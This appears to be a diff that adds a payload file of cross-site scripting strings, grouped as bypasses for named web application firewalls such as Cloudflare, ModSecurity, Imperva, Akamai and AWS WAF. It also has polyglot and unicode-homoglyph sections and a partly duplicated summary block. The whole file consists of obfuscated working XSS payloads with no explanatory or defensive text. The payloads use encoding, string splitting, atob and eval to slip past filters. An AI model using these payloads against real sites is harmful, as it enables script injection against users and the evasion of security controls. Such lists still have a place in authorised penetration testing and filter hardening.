@@ -1,0 +1,178 @@
+# Advanced WAF Bypass Techniques - 2025 Edition
+
+# CloudFlare Bypasses
+<svg/onload=prompt(1)>
+<svg onload=alert&#40;1&#41>
+<svg onload=alert&#x28;1&#x29>
+<svg onload=alert%281%29>
+<a href="j&#97;v&#97;script&#x3A;&#97;lert(1)">Click</a>
+<svg/onload=self[`aler`%2b`t`]`1`>
+<ſvg/onload=alert(1)>
+<svg/onload=t=/ale/.source%2b/rt/.source;window[t](1)>
+<svg/onload=t=/ale/.source%2b/rt/.source;self[t](1)>
+<svg/onload=self[`\x61\x6c\x65\x72\x74`]`1`>
+<svg/onload=self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])>
+<svg/onload=self[atob('YWxlcnQ=')]`1`>
+
+# ModSecurity Bypasses
+<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
+<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1)>
+<img src=x onerror=window['ale'+'rt'](1)>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=setTimeout('al'+'ert(1)')>
+<img src=x onerror=with(window)alert(1)>
+<img src=x onerror=this['alert'](1)>
+
+# Imperva Bypasses
+<script>throw onerror=alert,1337</script>
+<script>'alert\x281\x29'instanceof{[Symbol.replace]:eval}</script>
+<script>with(top)alert(1)</script>
+<script>top['al'+'ert'](1)</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw addEventListener('error',alert),1</script>
+<script>throw InstallTrigger</script>
+<script>function/a/**/\u0028/a/**/\u0029{alert(1)}/a/**/\u0028/a/**/\u0029</script>
+<script>0..toString.call(this,alert(1),1)</script>
+<script>Array.from`1${alert}2`</script>
+
+# F5 BIG-IP Bypasses
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onpagehide=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<details open ontoggle=alert(1)>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+
+# Akamai Bypasses
+<script>onerror=alert;throw 1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>new Function`al\ert\`1\``</script>
+<script>promise=Promise.reject();promise.then(x=>{},alert);</script>
+<script>promise=Promise.reject();promise.catch(alert);</script>
+<script>promise=Promise.resolve();promise.finally(alert);</script>
+<script>fetch('').catch(alert)</script>
+<script>new Promise(alert)</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Fortinet FortiWeb Bypasses
+<a href="javascript:void(0)" onmouseover=alert(1)>hover me</a>
+<a href="javascript:void(0)" onmouseenter=alert(1)>hover me</a>
+<a href="javascript:void(0)" onmousemove=alert(1)>hover me</a>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<form><input type=submit formaction=javascript:alert(1) value=click></form>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(1)>click</button>
+<video><source onerror=alert(1)>
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<math href="javascript:alert(1)">click</math>
+<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>
+
+# AWS WAF Bypasses
+<img src=x onerror=\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}(1)>
+<img src=x onerror=window['a'+'l'+'e'+'r'+'t'](1)>
+<img src=x onerror=globalThis['a'+'l'+'e'+'r'+'t'](1)>
+<img src=x onerror=self['\x61\x6c\x65\x72\x74'](1)>
+<img src=x onerror=this[atob('YWxlcnQ=')](1)>
+<img src=x onerror=Function("a"+"l"+"e"+"r"+"t(1)")()>
+<img src=x onerror=(()=>{a\u{006C}ert(1)})()>
+<img src=x onerror=eval('\\u0061\\u006C\\u0065\\u0072\\u0074(1)')>
+<img src=x onerror=setTimeout('\u0061\u006C\u0065\u0072\u0074(1)')>
+<img src=x onerror=new Function`a\u006Cert\`1\``>
+
+# Barracuda WAF Bypasses
+<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+<svg><script>alert&#96;1&#96;</script>
+<svg><script>alert&#x60;1&#x60;</script>
+<svg><script>alert(1)</script>
+<svg><script>alert&#40;1&#41;</script>
+<svg><script>alert&#050;&#049;&#041;</script>
+<svg><script>window['alert'](1)</script>
+<svg><script>parent['alert'](1)</script>
+<svg><script>self['alert'](1)</script>
+<svg><script>top['alert'](1)</script>
+
+# Citrix NetScaler WAF Bypasses
+<img src=x onerror="window.onerror=alert;throw 1">
+<img src=x onerror="window.addEventListener('error',alert)">
+<img src=x onerror="window.addEventListener('error',function(){alert(1)})">
+<img src=x onerror="window.addEventListener('error',()=>alert(1))">
+<img src=x onerror="Promise.reject().catch(alert)">
+<img src=x onerror="Promise.reject().then(x=>{},alert)">
+<img src=x onerror="fetch('').catch(alert)">
+<img src=x onerror="new Promise(alert)">
+<img src=x onerror="import('data:text/javascript,alert(1)')">
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+
+# Polyglot WAF Bypasses
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>"
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>"
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+<script>throw/**/onerror=alert,1337</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+
+# Mixed WAF Bypasses
+<script>$=1,alert($)</script>
+<script>_=alert;_(1)</script>
+<script>$={_:alert};$._($)</script>
+<script>$=alert;$(1)</script>
+<script>$=this;$.alert(1)</script>
+<script>$=parent;$.alert(1)</script>
+<script>$=top;$.alert(1)</script>
+<script>$=self;$.alert(1)</script>
+<script>$=window;$.alert(1)</script>
+<script>$=globalThis;$.alert(1)</script>
+
+# Unicode Normalization Bypasses
+<img src=x onerror=ａlert(1)>
+<img src=x onerror=аlert(1)>
+<img src=x onerror=аlеrt(1)>
+<img src=x onerror=аlеrт(1)>
+<img src=x onerror=alert(１)>
+<img src=x onerror=ａｌｅｒｔ(１)>
+<img src=x onerror=window['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
+<img src=x onerror=self['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
+<img src=x onerror=top['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
+<img src=x onerror=parent['\u{0061}\u{006C}\u{0065}\u{0072}\u{0074}'](1)>
+
+# Advanced WAF Bypass Techniques - 2025 Edition
+# CloudFlare/ModSecurity/Imperva/Akamai/F5/Barracuda/AWS/Fortinet
+<svg/onload=prompt(1)>
+<svg onload=alert&#40;1&#41>
+<a href="j&#97;v&#97;script&#x3A;&#97;lert(1)">Click</a>
+<svg/onload=self[`aler`%2b`t`]`1`>
+<svg/onload=self['alert'](1)>
+<img src=x onerror=window['ale'+'rt'](1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>throw onerror=alert,1337</script>
+<script>with(top)alert(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<video><source onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<script>promise=Promise.reject();promise.then(x=>{},alert);</script>
+<script>import('data:text/javascript,alert(1)')</script>
+<img src=x onerror=Function("a"+"l"+"e"+"r"+"t(1)")()>
+<img src=x onerror=(()=>{a\u{006C}ert(1)})()>
+<img src=x onerror=setTimeout('ale'+'rt(1)')>
+<img src=x onerror=this['alert'](1)>
+
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+
+# More advanced payloads in custom_payloads/waf-advanced-bypass.txt
